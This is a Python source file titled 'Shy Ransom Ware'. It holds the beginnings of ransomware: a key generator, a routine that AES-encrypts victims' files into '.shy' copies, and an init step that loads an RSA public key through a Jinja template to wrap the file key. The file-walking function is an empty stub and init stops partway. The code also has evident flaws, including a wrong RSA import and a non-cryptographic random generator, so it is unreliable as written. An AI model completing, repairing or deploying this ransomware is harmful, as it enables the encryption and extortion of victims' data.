'''
Shy Ransom Ware written in python
'''
from Crypto.Cipher import AES, RSA
import random
import string
import struct
from os.path import getsize


global KEY
KEY = ""


def generateKey(length=30):
    """
    generate an encryption key with a given length
    """
    output = ""
    for _ in range(length):
        output += random.choice(string.ascii_uppercase + string.digits)
    return output


def encryptFile(aesobj, filename):
    """
    Encrypt a file given an already created AES object
    Output the file to the filename + extension
    """
    # Create the output filename
    outfilename = filename + ".shy"
    # Claculate the filesize
    filesize = getsize(filename)
    # Open the input and output file
    with open(filename, 'rb') as infile:
        with open(outfilename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            while True:
                chunk = infile.read(64 * 1024)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(aesobj.encrypt(chunk))


def walkTargets(targets):
    """
    Walk through all the targets and encrypt them
    """
    pass


def init():
    # Jinja will replace the PUBKEY here
    publickey = "{{ RSA_PUBLIC_KEY }}"
    # Create an RSA public key object
    rsaPubKey = RSA.importKey(publickey)
    key = generateKey()
    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
